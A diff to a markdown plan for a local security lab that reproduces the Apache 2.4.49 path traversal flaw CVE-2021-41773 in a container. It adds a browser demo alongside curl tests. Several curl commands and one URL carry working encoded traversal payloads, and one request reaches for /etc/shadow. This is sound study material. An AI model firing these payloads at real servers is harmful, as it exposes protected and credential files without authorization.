@@ -61,22 +61,31 @@ CVE-2021-41773 is a path traversal bug in Apache 2.4.49 caused by insufficient U
 ### Prerequisites
 - Phase 1 complete and container running (`cve-2021-41773-lab`).
 - Target file: `/opt/protected/protected.txt` (placed at `/opt/protected/` inside the container, outside the document root `htdocs/`).
+- Demo mode: use a **hybrid approach** (browser for visual storytelling, `curl` for reliable verification).
 
-### Test Cases
+### Test Cases (Hybrid: Browser + curl)
 
-**Test 1 — Path traversal to read protected file**
+**Test 1 — Browser visual demo**
+1. Open: `http://localhost:8080/`
+2. In the browser URL bar, try:
+   `http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/opt/protected/protected.txt`
+3. If the browser normalizes the URL and it fails, try an encoding variant (e.g., `%2e%2e/` or `..%2f`).
+
+Expected (vulnerable): protected file contents are rendered as raw response text.
+
+**Test 2 — Reliable terminal verification**
 ```bash
 curl "http://localhost:8080/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/protected/protected.txt"
 ```
 Expected (vulnerable): contents of `protected.txt` are returned.
 
-**Test 2 — Alternative encoding variant**
+**Test 3 — Alternative encoding variant**
 ```bash
 curl "http://localhost:8080/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/protected/protected.txt"
 ```
 Expected (vulnerable): same file contents returned.
 
-**Test 3 — Attempt against a non-existent path (negative control)**
+**Test 4 — Attempt against a non-existent path (negative control)**
 ```bash
 curl "http://localhost:8080/cgi-bin/%2e%2e/%2e%2e/etc/shadow"
 ```
@@ -84,19 +93,22 @@ Expected: file does not exist inside container; HTTP 404.
 
 ### Tasks
 1. Enable `mod_cgi` or confirm an alias that allows traversal (the `<Directory />` config already grants traversal access).
-2. Run each test case and capture full request + response:
+2. Run browser demo first for presentation clarity, then confirm with `curl` for reliability.
+3. Run each curl test case and capture full request + response:
    ```bash
    curl -v "http://localhost:8080/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/protected/protected.txt" \
        2>&1 | tee exploit/evidence/phase2-traversal.txt
    ```
-3. Document exact HTTP status codes, response bodies, and any error messages observed.
-4. Note limitations (e.g., which path aliases are required, which encodings work).
+4. Document exact HTTP status codes, response bodies, and any error messages observed.
+5. Note limitations (e.g., browser URL normalization behavior, which path aliases are required, which encodings work).
 
 ### Record Evidence
+- Save at least one browser screenshot showing exploit URL + raw response.
 - Save all curl outputs to `exploit/evidence/`.
 - Add a short `exploit/README.md` update summarizing what worked and what did not.
 
 ### Acceptance ✅
+- [ ] Browser-based exploit attempt demonstrated and documented
 - [ ] Path traversal successfully reads `/opt/protected/protected.txt` on the vulnerable image
 - [ ] Both encoding variants tested and results documented
 - [ ] Negative control confirms non-existent paths return 404
@@ -191,7 +203,7 @@ Compare the vulnerable Apache 2.4.49 behavior against two mitigations:
    | Phase 4 — Slides / presentation | | ⬜ |
 
 4. **Presentation / Slides**
-   - Overview of CVE, lab architecture, demo walkthrough, mitigation comparison, lessons learned.
+   - Overview of CVE, lab architecture, **hybrid demo walkthrough (browser + curl)**, mitigation comparison, lessons learned.
 
 ### Acceptance ✅
 - [ ] Final write-up committed to repo
